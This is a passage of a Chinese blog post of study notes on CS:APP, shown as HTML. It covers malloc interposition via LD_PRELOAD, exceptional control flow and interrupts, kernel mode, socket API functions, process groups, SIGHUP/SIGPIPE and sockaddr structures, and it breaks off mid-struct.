class="keyword">if</span>(<span class="literal">NULL</span> == realMalloc)</span><br><span class="line">    &#123;</span><br><span class="line">        error = dlerror();</span><br><span class="line">        <span class="built_in">fputs</span>(error,<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *ptr = realMalloc(size);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == calltimes)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    &#125; </span><br><span class="line">    calltimes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>运行时打桩：可以通过设置LD_PRELOAD环境变量，达到在你加载一个动态库或者解析一个符号时，先从LD_PRELOAD指定的目录下的库去寻找需要的符号，然后再去其他库中寻找 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -DMYMOCK -shared -fPIC -o libmymalloc.so mymalloc.c -ldl</span><br><span class="line">    <span class="comment">//将mymalloc.c制作成动态库 &gt;&gt; libmymalloc.so</span></span><br><span class="line">$ LD_PRELOAD=<span class="string">&quot;./libmymalloc.so&quot;</span> <span class="comment">//设置LD_PRELOAD环境变量</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0x95f010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：程序优先从”./libmymalloc.so”找到了“打桩malloc”</p>
<h2 id="异常控制流-ECF"><a href="#异常控制流-ECF" class="headerlink" title="异常控制流(ECF)"></a>异常控制流(ECF)</h2><p>程序可以使控制流发生“突变”来处理异常情况，这些“突变”就是<strong>异常控制流</strong></p>
<p>应用程序可以使用“陷阱（trap）”或者“系统调用（syscall）”的ECF形式，向操作系统请求服务：向磁盘中写数据，从网络中读数据，创建一个新进程，终止当前进程</p>
<h2 id="同步-amp-异步"><a href="#同步-amp-异步" class="headerlink" title="同步&amp;异步"></a>同步&amp;异步</h2><p>同步，是所有的操作都做完，才返回给用户结果，即写完数据库之后，在相应用户</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808617642-1646286364493-1646808754597-1646808862602.png" class width="1641808617642">  
<p>异步，不用等所有操作等做完，就相应用户请求，即先相应用户请求，然后慢慢去写数据库</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808601924-1646286364493-1646808754597-1646808862603.png" class width="1641808601924">  
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是控制流中的一种形式，它一部分由硬件实现，一部分由操作系统实现</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795301380-1646286364493-1646808754597-1646808862603.png" class width="1641795301380"> 
<ul>
<li>CPU检测到flag寄存器中的异常数据</li>
<li>CPU控制IP指针，通过“异常表的跳转表”跳转对应的处理程序</li>
<li>处理完成后，进行相对应的操作（终止进程，继续进程，输出报错信息……）</li>
</ul>
<p>系统把每种类型的异常都分配了一个<strong>唯一非负</strong>的异常号</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795607023-1646286364493-1646808754597-1646808862603.png" class width="1641795607023"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795655882-1646286364493-1646808754597-1646808862603.png" class width="1641795655882"> 
<p>异常表的基址放在一个叫<strong>异常表基址寄存器</strong>的特殊CPU寄存器中</p>
<p><strong>异常的类型</strong></p>
<p>异常分为4种：中断（interrupt），陷阱（trap），故障（fault），终止（abort）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>原因</th>
<th>异步/同步</th>
<th>返回行为</th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>来自“I/O”设备的信号</td>
<td>同步&amp;异步</td>
<td>总是返回到下一条指令</td>
</tr>
<tr>
<td>陷阱</td>
<td>有意的异常</td>
<td>同步</td>
<td>总是返回到下一条指令</td>
</tr>
<tr>
<td>故障</td>
<td>潜在可恢复的错误</td>
<td>同步</td>
<td>可能返回到当前指令</td>
</tr>
<tr>
<td>终止</td>
<td>不可恢复的错误</td>
<td>同步</td>
<td>不会返回</td>
</tr>
</tbody>
</table>
</div>
<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断程序信号处理的一种机制</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641809627084-1646286364493-1646808754597-1646808862603.png" class width="1641809627084"> 
<p>中断分为 <strong>内中断</strong> 和 <strong>外中断</strong></p>
<p><strong>内中断概述</strong></p>
<p>任何一个CPU都有一种能力：</p>
<p>可以在执行完<strong>当前指令</strong>后检测到从CPU内部产生的一种<strong>特殊信息</strong>，并立刻进行处理</p>
<p>这种特殊信息就是<strong>中断信息</strong></p>
<p>​        //中断信息要求CPU立马进行处理，并携带了必备的参数</p>
<p>内中断可以使计算机可以处理<strong>紧急情况</strong></p>
<p>内中断在程序中有意地产生，所以是主动的，也是<strong>“同步”</strong>的</p>
<p><strong>内中断产生</strong></p>
<p>1.除法错误（TF=0）</p>
<p>2.单步执行（TF=1）</p>
<p>3.执行”into”指令（TF=4）</p>
<p>4.执行”int  n”指令（TF=n）</p>
<p>对于8086CPU，这4种情况可以产生<strong>中断信息</strong></p>
<p><strong>外中断概述</strong></p>
<p>CPU除了进行运算以外，还要有对 <strong>I/O</strong> 能力（输入/输出），但是外设的输入输出 <strong>随时</strong> 可能发生，CPU必须要拥有可以 <strong>及时处理</strong> 这些信息的能力，这就引入了外中断的思想</p>
<p>这种中断发生完全是<strong>“异步”</strong>的，根本无法预测到此类中断会在什么时候发生</p>
<p><strong>外中断产生</strong></p>
<p>外设的输入将被存放在端口中，而其输入随时可能到达</p>
<p>信息到达时，外设的相关芯片会给CPU发出相应的<strong>中断信息</strong>，当CPU执行完当前的指令后，一旦检测到该<strong>中断信息</strong>，就会触发外中断，行为上和内中断相似</p>
<p>在PC系统中，外中断源一般有以下两类：</p>
<p>1.可屏蔽中断：</p>
<p>可屏蔽中断是CPU可以<strong>不响应</strong>的中断</p>
<p>其到底响不响应，主要是看<strong>IF</strong>寄存器（“<strong>IF</strong> = 1” ——&gt; 响应，“<strong>IF</strong> = 0” ——&gt; 不响应）</p>
<p>在CPU执行某个中断时，会把<strong>IF</strong>设置为“0”，可以暂时屏蔽其他中断</p>
<p>​        //指令sti：设置“IF=1”，指令cli：设置“IF=0”</p>
<p>2.不可屏蔽中断：</p>
<p>不可屏蔽中断是CPU必须执行的外中断，不可屏蔽中断<strong>不需要</strong>中断类型码，立即引发响应</p>
<p><strong>中断向量表</strong></p>
<p>中断向量表中保存了256个中断处理程序的入口</p>
<p>CPU接收到中断类型码后，就会根据中断类型表找到中断处理程序的入口</p>
<p><strong>中断过程</strong></p>
<p>1.CPU获取中断类型码</p>
<p>2.flag寄存器入栈（中断过程会改变flag寄存器）</p>
<p>3.设置flag寄存器的<strong>TF</strong>和<strong>IF</strong>为“0”</p>
<p>4.<strong>CS</strong>寄存器入栈</p>
<p>5.<strong>IP</strong>寄存器入栈</p>
<p>6.从中断向量表中读取中断处理程序的入口地址</p>
<p><strong>中断检查</strong></p>
<p>中断信息会被存储在flag寄存器的<strong>TF</strong>位中（TF = n：中断类型码为“n”）</p>
<p>CPU读取到此信息后就会开始<strong>中断过程</strong></p>
<h2 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h2><p>陷阱是有意的异常，是执行一条指令的结果</p>
<p>陷阱最重要的用途：在“用户程序”和“内核”之间提供一个一样的接口，称为<strong>系统调用</strong></p>
<p>处理器提供了一条特殊的指令：syscall，用于用户请求系统调用</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808750527-1646286364493-1646808754597-1646808862603.png" class width="1641808750527"> 
<p>有些基于读写的操作必须要在 <strong>“内核模式”</strong> 中完成，而系统调用为了实现这些功能而诞生的，它通过提供 <strong>有权限限制</strong> 的  <strong>“内核模式”</strong> ，来实现一些 <strong>“用户模式”</strong> 无法办到的操作</p>
<p>用户程序通过系统调用从用户态（user mode）切换到核心态（ kernel mode ），从而可以访问相应的资源。这样做的好处是：</p>
<ul>
<li>为用户空间提供了一种硬件的抽象接口，使编程更加容易</li>
<li>有利于系统安全</li>
<li>有利于每个进程度运行在虚拟系统中，接口统一有利于移植</li>
</ul>
<p>当然，中断也可以实现系统调用（“int 80”）</p>
<h2 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h2><p>故障是由错误引起的，但是它<strong>可能</strong>可以被故障处理程序修正</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641809596891-1646286364493-1646808754597-1646808862603.png" class width="1641809596891"> 
<p>当发生故障时，处理器会将控制转移给<strong>故障处理程序</strong>：如果可以修正故障，那么程序将返回并继续执行，否则，程序将返回内核中的“abort例程”并终止该程序</p>
<h2 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h2><p>终止是不可恢复的致命错误的结果，通常是一些硬件错误</p>
<p>终止处理程序将直接<strong>终止</strong>目标程序，不会返回任何信息</p>
<h2 id="内核模式"><a href="#内核模式" class="headerlink" title="内核模式"></a>内核模式</h2><p>处理器通常是用某个控制寄存器中的<strong>模式位</strong>来表示“当前进程的特权”</p>
<p>共两种特权：“用户模式”，“内核模式”</p>
<h2 id="套接字接口"><a href="#套接字接口" class="headerlink" title="套接字接口"></a>套接字接口</h2><p><strong>套接字接口</strong>（socket interface）是一组函数，它们和 Unix I/O 函数结合起来，用以创建网络应用</p>
<p>大多数现代系统上都实现套接字接口，包括所有的 Unix 变种、Windows 和 Macintosh 系统</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646286717853-1646657383406-1646808754597-1646808862603.png" class width="1646286717853">  
<p>​        // 从 Linux 内核的角度来看，一个套接字就是 <strong>通信的一个端点</strong> ，从 Linux 程序的角度来看，套接字就是一个 <strong>有相应描述符的打开文件</strong></p>
<p>因特网的套接字地址存放在所示的类型为 sockaddr_in 的 16 字节结构中（IP 地址和端口号总是以网络字节顺序（大端法）存放的）</p>
<p>下面将介绍套接字接口中的部分函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="comment">// domain：即协议域，又称为协议族（family）</span></span><br><span class="line"><span class="comment">// type：指定socket类型</span></span><br><span class="line"><span class="comment">// protocol：指定协议</span></span><br></pre></td></tr></table></figure>
<p>​        // 协议族决定了 socket 的地址类型，在通信中必须采用对应的地址</p>
<p><strong>socket 函数</strong> 用于来返回一个 <strong>套接字描述符</strong> （clientfd）</p>
<ul>
<li>套接字描述符：用来标定系统为当前的进程划分的一块缓冲空间，类似于文件描述符 </li>
<li>文件描述符：是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有 I/O 操作相关的系统调用都需要通过文件描述符（open的返回值fd）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">// sockfd：需要绑定的socket</span></span><br><span class="line"><span class="comment">// *addr：存放了服务端用于通信的地址和端口</span></span><br><span class="line"><span class="comment">// addrlen: sizeof(sockaddr_in)</span></span><br></pre></td></tr></table></figure>
<p><strong>bind 函数</strong> 告诉内核将 addr 中的服务器套接字地址和套接字描述符 sockfd 联系起来</p>
<p>​        // bind函数把一个本地协议地址赋予一个套接字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> clientfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">// clientfd：套接字描述符的一种</span></span><br><span class="line"><span class="comment">// addrlen：sizeof(sockaddr_in)</span></span><br></pre></td></tr></table></figure>
<p><strong>connect 函数</strong> 试图与 “套接字地址为 addr 的服务器” 建立一个因特网连接</p>
<p>如果成功，clientfd 描述符现在就准备好可以读写了(最好用 getaddrinfo 来为 connect 提供参数)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="comment">// sockfd：需要绑定的socket</span></span><br><span class="line"><span class="comment">// backlog：暗示了内核在开始拒绝连接请求之前，队列中要排队的未完成的连接请求的数量</span></span><br></pre></td></tr></table></figure>
<p><strong>listen 函数</strong> 将 sockfd 从一个 <strong>主动套接字</strong> 转化为一个 <strong>监听套接字</strong> （listening socket），该套接字可以接受来自客户端的连接请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> listenfd, struct sockaddr *addr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br><span class="line"><span class="comment">// listenfd：服务器的socket描述符</span></span><br><span class="line"><span class="comment">// *addr：指向struct sockaddr *的指针</span></span><br><span class="line"><span class="comment">// *addrlen：协议地址的长度</span></span><br></pre></td></tr></table></figure>
<p><strong>accept 函数</strong> 等待来自客户端的连接请求到达侦听描述符 listenfd，然后在 addr 中填写客户端的套接字地址，并返回一个 <strong>已连接描述符</strong> </p>
<p>一个服务器通常通常仅仅只创建一个监听socket描述字，内核为每个由服务器进程接受的客户连接创建了一个已连接socket描述字，当服务器完成了对某个客户的服务，相应的已连接socket描述字就被关闭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getaddrinfo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *host, <span class="keyword">const</span> <span class="keyword">char</span> *service,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> struct addrinfo *hints,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct addrinfo **result)</span></span>;</span><br><span class="line"><span class="comment">// host &amp; service：套接字地址的两个组成部分</span></span><br><span class="line"><span class="comment">// 可选的参数 hints 是一个 addrinfo 结构，它提供对 getaddrinfo 返回的套接字地址列表的更好的控制</span></span><br><span class="line"><span class="comment">// getaddrinfo 返回 result，result 一个指向 addrinfo 结构的链表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeaddrinfo</span><span class="params">(struct addrinfo *result)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">gai_strerror</span><span class="params">(<span class="keyword">int</span> errcode)</span></span>; <span class="comment">// 返回：错误消息</span></span><br></pre></td></tr></table></figure>
<p><strong>getaddrinfo 函数</strong> 将主机名、主机地址、服务名和端口号的字符串表示转化成套接字地址结构，它是已弃用的 gethostbyname 和 getservbyname 函数的新的替代品 </p>
<p>在客户端调用了 getaddrinfo 之后，会遍历这个列表，依次尝试每个套接字地址，直到调用 socket 和 connect 成功，建立起连接，类似地，服务器会尝试遍历列表中的每个套接字地址，直到调用 socket 和 bind 成功，描述符会被绑定到一个合法的套接字地址，</p>
<ul>
<li>为了避免内存泄漏，应用程序必须在最后调用 freeaddrinfo，释放该链表</li>
<li>如果 getaddrinfo 返回非零的错误代码，应用程序可以调用 gai_streeror，将该代码转换成消息字符串</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>             ai_flags;      <span class="comment">/* Hints argument flags */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_family;     <span class="comment">/* First arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_socktype;   <span class="comment">/* Second arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_protocol;   <span class="comment">/* Third arg to socket function */</span></span><br><span class="line">    <span class="keyword">char</span>            *ai_canonname; <span class="comment">/* Canonical hostname */</span></span><br><span class="line">    <span class="keyword">size_t</span>          ai_addrlen;    <span class="comment">/* Size of ai_addr struct */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">ai_addr</span>;</span>      <span class="comment">/* Ptr to socket address structure */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">ai_next</span>;</span>      <span class="comment">/* Ptr to next item in linked list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646312037232-1646808754597-1646808862603.png" class width="1646312037232"> 
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getnameinfo</span><span class="params">(<span class="keyword">const</span> struct sockaddr *sa, <span class="keyword">socklen_t</span> salen,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">char</span> *host, <span class="keyword">size_t</span> hostlen,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">char</span> *service, <span class="keyword">size_t</span> servlen, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="comment">// *sa：指向大小为 salen 字节的套接字地址结构</span></span><br><span class="line"><span class="comment">// *host 指向大小为 hostlen 字节的缓冲区</span></span><br><span class="line"><span class="comment">// *service 指向大小为 servlen 字节的缓冲区</span></span><br><span class="line"><span class="comment">// 参数 flags 是一个位掩码，能够修改默认的行为</span></span><br></pre></td></tr></table></figure>
<p><strong>getnameinfo 函数</strong> 和 getaddrinfo 是相反的，将一个套接字地址结构转换成相应的主机和服务名字符串，它是已弃用的 gethostbyaddr 和 getservbyport 函数的新的替代品 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_clientfd</span><span class="params">(<span class="keyword">char</span> *hostname, <span class="keyword">char</span> *port)</span></span>;</span><br><span class="line"><span class="comment">// *hostname：服务器运行的地址</span></span><br><span class="line"><span class="comment">// *port：指向端口</span></span><br></pre></td></tr></table></figure>
<p>客户端调用 open_clientfd 建立与服务器的连接 </p>
<p><strong>open_clientfd 函数</strong> 建立与服务器的连接，该服务器运行在主机 hostname 上，并在端口号 port 上监听连接请求 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_listenfd</span><span class="params">(<span class="keyword">char</span> *port)</span></span>;</span><br><span class="line"><span class="comment">// *port：指向端口号</span></span><br></pre></td></tr></table></figure>
<p><strong>open_listenfd 函数</strong> 打开和返回一个监听描述符，这个描述符准备好在端口 port_h 接收连接请求 </p>
<h2 id="网络编程中的信号"><a href="#网络编程中的信号" class="headerlink" title="网络编程中的信号"></a>网络编程中的信号</h2><p><strong>进程组</strong></p>
<p>进程组就是一系列相互关联的进程集合，系统中的每一个进程也必须从属于某一个进程组，每个进程组中都会有一个唯一的 ID(process group id)，简称 PGID，PGID 一般等同于进程组的创建进程的 Process ID，而这个进进程一般也会被称为进程组先导(process group leader)，同一进程组中除了进程组先导外的其他进程都是其子进程</p>
<p>进程组的存在，方便了系统对多个相关进程执行某些统一的操作，例如：我们可以一次性发送一个信号量给同一进程组中的所有进程</p>
<p><strong>会话</strong></p>
<p>会话（session）是一个若干进程组的集合，同样的，系统中每一个进程组也都必须从属于某一个会话</p>
<ul>
<li>一个会话只拥有最多一个控制终端（也可以没有），该终端为会话中所有进程组中的进程所共用</li>
<li>一个会话中前台进程组只会有一个，只有其中的进程才可以和控制终端进行交互，除了前台进程组外的进程组，都是后台进程组</li>
</ul>
<p>和进程组先导类似，会话中也有会话先导(session leader)的概念，用来表示建立起到控制终端连接的进程，在拥有控制终端的会话中，session leader 也被称为控制进程(controlling process)，一般来说控制进程也就是登入系统的 shell 进程(login shell)</p>
<p><strong>带外数据</strong></p>
<p>带外数据用于迅速告知对方本端发生的重要的事件，它比普通的数据（带内数据）拥有更高的优先级， <strong>不论发送缓冲区中是否有排队等待发送的数据，它总是被立即发送</strong> ，带外数据的传输可以使用一条独立的传输层连接，也可以映射到传输普通数据的连接中，</p>
<p>​        // 实际应用中，带外数据是使用很少见，有 telnet 和 ftp 等远程非活跃程序</p>
<p>UDP没有没有实现带外数据传输，TCP也没有真正的带外数据，不过TCP利用头部的紧急指针标志和紧急指针，为应用程序提供了一种紧急方式，含义和带外数据类似，TCP的紧急方式利用传输普通数据的连接来传输紧急数据</p>
<p><strong>SIGHUP信号</strong>（关闭进程）</p>
<p>SIGHUP 信号在 <strong>用户终端连接(正常或非正常)结束</strong> 时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业(任务)，这时它们与控制终端不再关联</p>
<p>系统对SIGHUP信号的默认处理是：<strong>终止收到该信号的进程</strong> ，所以若程序中没有捕捉该信号，当收到该信号时，进程就会退出</p>
<p>SIGHUP会在以下3种情况下被发送给相应的进程：</p>
<ul>
<li>终端关闭时，该信号被发送到 session 首进程以及作为 job 提交的进程（即用 &amp; 符号提交的进程）</li>
<li>session 首进程退出时，该信号被发送到该 session 中的前台进程组中的每一个进程</li>
<li>若父进程退出导致进程组成为孤儿进程组，且该进程组中有进程处于停止状态（收到SIGSTOP或SIGTSTP信号），该信号会被发送到该进程组中的每一个进程</li>
</ul>
<p>例如：在我们登录Linux时，系统会分配给登录用户一个终端(Session)，在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个 Session，当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号，这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止</p>
<p>​        // 晦涩难懂，需要在实例中理解分析</p>
<p><strong>SIGPIPE信号</strong>（告知中断）</p>
<p>当 <strong>往一个写端关闭的管道或 socket 连接中连续写入数据时会引发 SIGPIPE 信号</strong>（引发 SIGPIPE 信号的写操作将设置 errno 为EPIPE）</p>
<p>在TCP通信中，当通信的双方中的一方close一个连接时，若另一方接着发数据，根据TCP协议的规定，会收到一个RST(Reset the connection)响应报文，若再往这个服务器发送数据时，系统会发出一个SIGPIPE信号给进程，<strong>告诉进程这个连接已经断开了，不能再写入数据</strong></p>
<ul>
<li>即使断开还可以进行一次通信，第二次发送数据时才触发SIGPIPE</li>
<li>可以用相应的 handle 进行处理SIGPIPE，完成想要的操作</li>
</ul>
<h2 id="网络编程结构体"><a href="#网络编程结构体" class="headerlink" title="网络编程结构体"></a>网络编程结构体</h2><p><strong>通用结构体：struct sockaddr，16个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generic socket address structure (for connect, bind, and accept) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>   sa_family;      <span class="comment">/* Protocol family */</span></span><br><span class="line">    <span class="keyword">char</span>       sa_data[<span class="number">14</span>];    <span class="comment">/* Address data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>struct sockaddr 是一个通用地址结构，这是为了统一地址结构的表示方法，统一接口函数，使不同的地址结构可以被bind() , connect() 等函数调用</p>
<p>sockaddr的缺陷：sa_data 把目标地址和端口信息混在一起了 </p>
<p><strong>通用结构体：struct sockaddr_storage，128个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Structure large enough to hold any socket address </span></span><br><span class="line"><span class="comment">  (with the historical exception of AF_UNIX). 128 bytes reserved.  */</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ULONG_MAX &gt; 0xffffffff</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __ss_aligntype __uint64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __ss_aligntype __uint32_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SS_SIZE        128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SS_PADSIZE     (_SS_SIZE - (2 * sizeof (__ss_aligntype)))</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     <span class="keyword">uint16_t</span>          ss_family;     <span class="comment">/* Address family */</span></span><br><span class="line">     __ss_aligntype   __ss_align;     <span class="comment">/* Force desired alignment.  */</span></span><br><span class="line">     <span class="keyword">char</span> __ss_padding[_SS_PADSIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>struct sockaddr_storage 被设计为同时适合 struct sockaddr_in 和 struct sockaddr_in6 </p>
<p>为了避免试图知道要使用的IP版本，可以使用 struct sockaddr_storage，该版本可以保存其中任何一个，后将通过 connect()，bind() 等函数将其类型转换为 struct sockaddr 并以这种方式进行访问 </p>
<p><strong>IPv4：struct sockaddr_in，16个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* IP socket address structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>       sin_family;   <span class="comment">/* Protocol family (always AF_INET) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>       sin_port;     <span class="comment">/* 16位的端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>     <span class="comment">/* 32位的IP地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="keyword">sizeof</span> (struct sockaddr) -</span><br><span class="line">                      